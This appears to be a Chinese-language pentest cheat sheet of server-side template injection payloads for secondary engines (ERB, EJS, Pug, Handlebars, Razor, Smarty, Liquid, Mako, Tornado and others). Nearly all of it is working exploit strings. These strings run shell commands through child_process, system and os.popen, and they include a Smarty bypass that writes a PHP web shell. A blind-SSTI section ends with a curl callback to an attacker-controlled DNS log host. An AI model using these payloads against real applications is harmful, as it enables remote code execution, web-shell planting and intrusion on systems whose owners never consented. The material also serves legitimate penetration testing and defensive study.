# SSTI — 边角场景 (SCENARIOS)

← 主文件 [ssti.md](ssti.md)

> 本文件收录 SSTI 的 **次主流引擎** (ERB/EJS/Pug/Handlebars/Razor/Smarty/Liquid/Mako) + **冷门引擎** + **Blind SSTI**。
> 引擎识别矩阵与 5 大主流引擎 (Jinja2 / Twig / Freemarker / Velocity / Thymeleaf) 仍在 [ssti.md](ssti.md)。

---

## 1. ERB (Ruby on Rails)

```erb
<%= `id` %>
<%= system('id') %>
<%= `whoami` %>
<%= eval("%x(id)") %>
<%= IO.popen('id').read() %>
```

---

## 2. EJS (Node.js)

```javascript
<%= 7*7 %>
<%= process.mainModule.require('child_process').execSync('id') %>
<%- global.process.mainModule.require('child_process').execSync('id') %>

# 过滤 require
<%= process.mainModule.constructor._load('child_process').execSync('id') %>
```

---

## 3. Pug / Jade (Node.js)

```
#{7*7}
#{global.process.mainModule.require('child_process').execSync('id')}

# 多行
- var x = global.process.mainModule.require('child_process').execSync('id').toString();
= x
```

---

## 4. Handlebars (Node.js)

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## 5. Razor (.NET)

```
@(1+2)
@{ var x = System.Diagnostics.Process.Start("cmd", "/c id"); }
```

---

## 6. Smarty (PHP)

```
{if phpinfo()}{/if}
{system('id')}
{passthru('id')}
```

如 secure mode 开启, 绕过:
```
{php}system("id");{/php}          # 老版本
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
```

---

## 7. Liquid (Shopify / Jekyll)

```
{{ 'a' | include: 'file' }}       # Jekyll - 可 LFI
{% assign x = 'a' %}
```

大多数 SaaS 版 Liquid 在 sandbox 中, 难达 RCE, 但可以 LFI / SSRF。

---

## 8. Mako (Python)

```
${self.module.cache.util.os.system('id')}

<% import os; os.system('id') %>
```

---

## 9. 冷门引擎

| 引擎 | payload |
|------|---------|
| **Angular** (client-side) | `{{constructor.constructor('alert(1)')()}}` (pre-1.6) |
| **Vue.js** (client-side) | `{{constructor.constructor('alert(1)')()}}` (v2 sandbox escape) |
| **Doctrine Twig** (PHP) | `{{["id"]|filter("system")}}` |
| **Plates** (PHP) | `{{= 7*7 }}` |
| **Tornado** (Python) | `{% import os %}{{ os.popen('id').read() }}` |
| **EEx** (Elixir) | `<%= :os.cmd('id') %>` |

---

## 10. Blind SSTI

若无回显, 用时间或 OOB:

```
# Jinja2 时间盲
{{ ''.__class__.__mro__[1].__subclasses__()[401]('sleep 5', shell=True).communicate() }}

# OOB
{{ ''.__class__.__mro__[1].__subclasses__()[401]('curl ATTACKER.dnslog.cn', shell=True) }}
```

---

## 11. 相关参考

- 主文件 → [ssti.md](ssti.md)
- 原型污染(Client XSS/Server RCE, 与部分 JS 引擎共存) → [prototype-pollution.md](prototype-pollution.md)
- Payload 速查 → [../payloads.md](../payloads.md)
